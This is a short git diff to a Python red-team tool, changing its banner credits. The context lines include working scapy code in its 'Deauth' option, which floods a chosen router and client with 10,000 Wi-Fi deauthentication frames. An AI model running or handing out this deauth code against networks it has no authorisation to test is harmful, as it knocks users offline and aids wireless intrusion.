@@ -63,10 +63,10 @@ def copyright_banner():
 
 def copyright_banner2():
     print("#------------------------------------------#")
-    print(f"#          Your Tool Name v1.0             #")
-    print("#            Created by YourName           #")
+    print(f"#          RedTeam Python v1.0            #")
+    print("#            Created by Mohammad           #")
     print("#              GitHub Repository:          #")
-    print("#   https://github.com/YourGitHubUsername  #")
+    print("#https://github.com/AsoMoe/Red-Team-Python #")
     print("#------------------------------------------#")
 
 
@@ -281,7 +281,7 @@ elif type_of_function == "D" or type_of_function == "Deauth":
         Mac1 = input("Enter mac address for the router:")
 
         Mac2 = input("Enter mac address for the targeted machine:")
-        
+
         brdmac = "ff:ff:ff:ff:ff:ff"
         pkt = scapy.RadioTap() / scapy.Dot11(addr1=brdmac, addr2=Mac1, addr3=Mac2) / scapy.Dot11Deauth()
         scapy.sendp(pkt, iface="wlan0", count=10000, inter=.1)
